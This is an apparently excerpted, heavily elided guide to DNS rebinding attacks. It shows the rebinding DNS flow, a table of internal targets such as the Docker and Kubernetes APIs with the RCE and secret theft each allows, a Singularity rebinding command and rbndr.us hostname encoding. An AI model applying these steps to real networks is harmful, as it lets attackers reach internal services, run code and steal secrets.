...
DNS query: attacker.com → REDACTED_INTERNAL_IP (internal target)
Browser sends request to REDACTED_INTERNAL_IP as "attacker.com" origin
        │
        ▼
...
| 2nd+ | Target internal IP (e.g., `REDACTED_INTERNAL_IP`) | 0 |
...
DNS response for attacker.com:
  ...
  A  REDACTED_INTERNAL_IP   (target — internal service)
...
5. Falls back to REDACTED_INTERNAL_IP → still same origin
...
| Docker API | `REDACTED_INTERNAL_IP:2375` | Container creation, host filesystem mount → RCE |
| Kubernetes API | `REDACTED_INTERNAL_IP:443/6443` | Pod creation, secret reading |
...
./singularity -DNSRebindStrategy round-robin \
    ...
    -ResponseReboundIPAddr REDACTED_INTERNAL_IP
```
...
Example: 7f000001.c0a80101.rbndr.us
  → alternates between 127.0.0.1 and REDACTED_INTERNAL_IP
  
Convert IP to hex:
  REDACTED_INTERNAL_IP → c0.a8.01.01 → c0a80101
